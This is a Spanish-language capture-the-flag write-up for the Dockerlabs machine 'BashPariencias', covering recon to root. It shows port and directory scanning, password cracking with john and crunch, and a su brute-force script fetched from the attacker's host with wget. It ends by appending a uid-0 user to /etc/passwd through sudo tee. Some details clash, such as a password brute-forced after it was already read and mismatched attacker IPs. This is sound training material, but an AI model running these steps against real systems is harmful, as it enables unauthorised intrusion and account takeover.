
# Writeup Template: Maquina `[ BashPariencias ]`

- Tags: #BashPariencias
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina BashPariencias](https://mega.nz/file/8b83zaaQ#yo9-megLYkQZ06a1R2RzgaaPzdk37zgcecF2hdgWwJU)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x bashpariencias.zip
sudo bash auto_deploy.sh bashpariencias.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.18.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.18.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.18.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.18.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.18.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80,8899 172.18.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp   open  http    Apache httpd
8899/tcp open  ssh     OpenSSH 6.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.18.0.2/
```

Al ingresar a la web principal tenemos el siguiente mensaje:
```txt
# Participa

Busca la entrada , despidieron a Rosa y en esta empresa tambien la echaremos no guarda bien sus contraseñas:la escondio en txt plano ni siquiera un methodo sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1  
[La despidieron por cagarla y solicitar permisos de root al jefe y tener un pass extrafuerte del rockyou. :-) Aqui podeis comprobar su metida de pata. en la empresa que trabajo antes](https://mega.nz/file/RG8GlDaD#haVrr92MyD-PgDUwxIJURT0q-P9Sl3kaNNBc-Ggppmg)
```

Esto indica que posiblemente se esten usando contrasenas debiles y tenemos un posible usuario: **rosa**.
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.18.0.2/ # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p80 172.18.0.2
```

Reporte:
```bash
/css/: Potentially interesting folder w/ directory listing
/images/: Potentially interesting folder w/ directory listing
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
===============================================================
/images/              (Status: 200) [Size: 1094]
/css/                 (Status: 200) [Size: 1118]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,ja,py
```

- **Hallazgos**:
```bash
/images               (Status: 301) [Size: 233] [--> http://172.18.0.2/images/]
/index.html           (Status: 200) [Size: 4655]
/css                  (Status: 301) [Size: 230] [--> http://172.18.0.2/css/]
/form.html            (Status: 200) [Size: 10232]
/app.html             (Status: 200) [Size: 7989]
/shell.php            (Status: 200) [Size: 1558]
```

Tenemos un formulario que tenemos que validar que no sea vulnerable
```bash
http://172.18.0.2/form.html?paymentMethod=on
```

Revisando el codigo fuente de esta misma url tenemos un campo oculto:
```bash
<h6 class="my-0">Second product</h6>
<small class="text-muted">Brief description rosa</small>
<p style="visibility: hidden;">rosa:lacagadenuevo</p>
```

Tenemos unas posibles credenciales de acceso por **ssh**

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que sabemos como es que se esta validando la informacion con php
```bash
http://172.18.0.2/shell.php
```

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  // Get form data
  $firstName = $_POST['firstName'];
  $lastName = $_POST['lastName'];
  $username = $_POST['username'];
  $email = $_POST['email'];
  $address = $_POST['address'];
  $address2 = $_POST['address2'];
  $country = $_POST['country'];
  $state = $_POST['state'];
  $zip = $_POST['zip'];
  $paymentMethod = $_POST['paymentMethod'];
  $ccName = $_POST['cc-name'];
  $ccNumber = $_POST['cc-number'];
  $ccExpiration = $_POST['cc-expiration'];
  $ccCvv = $_POST['cc-cvv'];
  // Basic validation (replace with more robust validation)
  if (empty($firstName) || empty($lastName) || empty($address) || empty($country) || empty($state) || empty($zip) || empty($paymentMethod) || empty($ccName) || empty($ccNumber) || empty($ccExpiration) || empty($ccCvv)) {
    echo "Please fill out all required fields.";
    exit;
  }
  // Process form data (e.g., save to database, send email)
  echo "Thank you for your order! Here's a summary of your information:<br>";
  echo "Name: $firstName $lastName<br>";
  echo "Username: $username<br>";
  echo "Email: $email<br>";
  echo "Address: $address";
  if (!empty($address2)) {
    echo ", $address2<br>";
  }
  echo "Country: $country<br>";
  echo "State: $state<br>";
  echo "Zip: $zip<br>";
  echo "Payment Method: $paymentMethod<br>";
  // You can implement additional logic here to process payment or send confirmation emails, etc.
} else {
  // This script was not called from a form submission
  echo "This script cannot be accessed directly.";
}
?>
```

De igual manera esta direccion url no tiene parametros:
```bash
wfuzz -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u "http://172.18.0.2/shell.php?FUZZ=test" --hh=1558
```

### Intrusion
Como tenemos un potencial usuario lo usaremos para intentar loguearnos por ssh ya que esta expuesto en el puerto **8899**
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.18.0.2 && ssh rosa@172.18.0.2 -p 8899 # ( lacagadenuevo )
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
cat /etc/passwd | grep "sh"
```

**Usuarios del sistema:**
```bash
root:x:0:0:root:/root:/bin/bash
juan:x:1001:1001:,,,:/home/juan:/bin/bash
carlos:x:1002:1002:,,,:/home/carlos:/bin/bash
rosa:x:1003:1003:,,,:/home/rosa:/bin/bash
```

### Explotacion de Privilegios

###### Usuario `[ Rosa ]`:
Viendo que son varios usuario, Es probable que tengamos que pivotear entre usuarios
Listando los procesos del sistema:
```bash
ps -faux
```

Tenemos una ruta con scripts
```bash
\_ /usr/sbin/CRON -P
    \_ /bin/sh -c /usr/share/bug/.scripts/passw_juan.sh
        \_ /bin/bash /usr/share/bug/.scripts/passw_juan.sh
            \_ sleep 58
```

Listando el directorio **home** tenemos un archivo secreto: **megasecret.txt**
```bash
ls -la /home

drwxr-xr-x  6 root   root   4096 Jun  9  2024 .
drwxr-xr-x 18 root   root   4096 Jul  6 11:31 ..
drwxr-x---  4 carlos carlos 4096 Jun  9  2024 carlos
drwxr-x---  2 juan   juan   4096 Jun  9  2024 juan
-rw-------  1 root   root     11 Jun  9  2024 megasecret.txt
drwxr-x---  5 rosa   rosa   4096 Jun  9  2024 rosa
drwxr-x---  2 ubuntu ubuntu 4096 Apr 29  2024 ubuntu
```

Revisamos su contenido:
```bash
cat /home/megasecret.txt
cat: /home/megasecret.txt: Permission denied
```

Para el usuario **rosa** tenemos un nombre de directorio con **-**
```bash
drwxrwxr-x 2 rosa rosa 4096 Jun  9  2024 -
```

Para acceder a este tenemos que hacerlo de la siguiente manera:
```bash
cd ~/-
```

Si listamos los archivos para ese directorio:
```bash
ls -la

-rw-rw-r-- 1 rosa rosa  215 Jun  9  2024 backup_rosa.zip
-rw-rw-r-- 1 rosa rosa  295 Jun  9  2024 irresponsable.txt
```

Revisando el contenido del archvio:
```bash
cat irresponsable.txt 
Hola rosa soy juan como ya conocemos tus irresposabilidades de otras empresas te voy a dejar mi contraseña en un fichero .zip, captúralo para no volver a ser despedida.
Con cariño pero nos pones a todos en riesgo.
Seguro no trabajaste tambien en Decathlon ....
Un poco de acoso laboral.....
```

Ahora como atacante sabemos que la contrasena del usuario **juan** se encuentra en ese archivo **zip**
Revisando vemos que si existe el binario de python
```bash
which python3
/usr/bin/python3
```

Ahora desde la maquina victima, Montamos un servidor para dejar accesible este archivo **zip**
```bash
python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ..
```

Ahora desde nuestra maquina atacante realizamos la peticion para descargarnos ese archivo **zip**
```bash
wget http://172.18.0.2:8080/backup_rosa.zip
```

Si intentamos descomprimir nos pide una contrasena, que no tenemos
```bash
7z x backup_rosa.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=es_MX.UTF-8 Threads:16 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 215 bytes (1 KiB)

Extracting archive: backup_rosa.zip
--
Path = backup_rosa.zip
Type = zip
Physical Size = 215

Enter password (will not be echoed):
```

Ahora usaremos **john** para crakear la contrasena y poder obtener el contenido:
Creamos primero el hash
```bash
zip2john backup_rosa.zip > hash
ver 1.0 efh 5455 efh 7875 backup_rosa.zip/password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=25, decmplen=13, crc=6A3D5968 ts=1B29 cs=1b29 type=0
```

Ahora rompemos el hash:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Tenemos la clave para ese archivo
```bash
Press 'q' or Ctrl-C to abort, almost any other key for status
123123           (backup_rosa.zip/password.txt)
```

Ahora de nuevo volvemos a descomprimir el archivo pero ya con la contrasena conrrecta:
```bash
7z x backup_rosa.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=es_MX.UTF-8 Threads:16 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 215 bytes (1 KiB)

Extracting archive: backup_rosa.zip
--
Path = backup_rosa.zip
Type = zip
Physical Size = 215

    
Enter password (will not be echoed): # ( 123123 )
Everything is Ok

Size:       13
Compressed: 215
```

Tenemos un archivo **password.txt** que si revisamos su contenido:
```bash
File: password.txt
───────────────────
hackwhitbash
```

Ahora nos loguearemos con el usuario **juan**
```bash
su juan # ( hackwhitbash )
```
###### Usuario `[ Juan ]`:
Listando los permisos para este usuario tenemos lo siguiente:
```bash
sudo -l

User juan may run the following commands on ac8724584bc1:
    (carlos) NOPASSWD: /usr/bin/tree
    (carlos) NOPASSWD: /usr/bin/cat
```

Nos aprovechamos de esto para ver la estructura de directorios del usuario: **carlos**
```bash
sudo -u carlos tree /home/carlos/
```

Tenemos lo siguiente:
```bash
/home/carlos/
└── password
```

Ahora nos aprovechamos para abusar del binario de **cat** para ver el contenido de su contrasena:
```bash
sudo -u carlos /usr/bin/cat /home/carlos/password
```

Tenemos la contrasena del usuario **carlos**
```bash
chocolateado
```

Ahora nos loguemos como este usuario:
```bash
su carlos # ( chocolateado )
```

###### Usuario `[ Carlos ]`:
Listando los archivos ocultos de este usuario tenemos:
```bash
ls -la

-rw-rw-r-- 1 carlos carlos  179 Jun  6  2024 .misecreto.txt
```

Revisando su contenido:
```bash
cat .misecreto.txt 
No se que hacer solo recuerdo el principio de mi password , olvide los tres ultimos caracteres y si cierro sesion no la recupero.

chocolateXXX

Temo que me despidan como a rosa.
```

Tenemos un pista de la posible password, Pero no sabemos los ultimos 3 digitos asi que usaremos el comando **crunch** para generar un diccionario personalizado que nos permita concatenar una crifra de 3 caracteres desde nuestra maquina atacante:
```bash
crunch 12 12 -t "chocolate%%%" -o wordlist.txt
```

Ahora igual desde nuestra maquina atacante montamos un servidor con python para transferir estas tres herramientas a la maquina victima:
```bash
Linux-Su-Force.sh
wordlist.txt
```

Ahora montamos el servidor para que este accesibles:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

Ahora desde la maquina victima realizamos la peticion para la transferencia de las herramientas:
```bash
wget http://172.17.0.1/Linux-Su-Force.sh
wget http://172.18.0.1/wordlist.txt

chmod +x Linux-Su-Force.sh
```

Ya con las herramientas en la maquina victima procedemos a realizar el ataque de fuerza bruta
```bash
bash Linux-Su-Force.sh carlos wordlist.txt
```

El primero con numeros no obtuvimos nada ahora intentaremos con caracteres alfabeticos
```bash
crunch 12 12 -t "chocolate@@@" -o wordlist.txt
```

Volvemos a realizar el proceso de enviar el diccionario otra ves con el servidor python a la maquina objetivo
Una ves que tenemos el otro diccionario, Lo volvemos a ejecutar
```bash
bash Linux-Su-Force.sh carlos wordlist.txt
```

Ahora si que tenemos la contrasena de usaurio **carlos**:
```bash
Contraseña encontrada para el usuario carlos: chocolateado
```

Ahora si listamos los permisos para este usaurio:
```bash
sudo -l # ( chocolateado )

User carlos may run the following commands on ac8724584bc1:
    (ALL : NOPASSWD) /usr/bin/tee
```

Tenemos una via potencial de migrar de **root** Y sabiendo que en directorio **home** existe un archivo que no podemos leer ya que no somos **root**, Podemos aprovecharnos de esto para ver su contendio:
```bash
-rw------- 1 root   root     11 Jun  9  2024 megasecret.txt
```

Para ganar acceso al objetivo necesitamos crear un nuevo usuario con privielgiso de **root**
```bash
 openssl passwd -1 -salt "hacker1" "hacker1"

$1$hacker1$OacyXpDn5mAwRfiDAg63o1
```

Ahoro nos aprovechamos de este binario para inyectarlo al archivo **passwd**
```bash
printf 'hacker1:$1$hacker1$OacyXpDn5mAwRfiDAg63o1:0:0:root:/root:/bin/bash\n' | sudo tee -a /etc/passwd

hacker1:$1$hacker1$OacyXpDn5mAwRfiDAg63o1:0:0:root:/root:/bin/bash
```

Ahora nos loguemaos como el nuevo usuario
```bash
# Comando para escalar al usuario: ( root )
su hacker1
```

---

## Evidencia de Compromiso
Flag de **root**
```bash
cat /home/megasecret.txt 
1234567890
DATA
```

```bash
# Captura de pantalla o output final
root@ac8724584bc1:/home/carlos# whoami
root
```
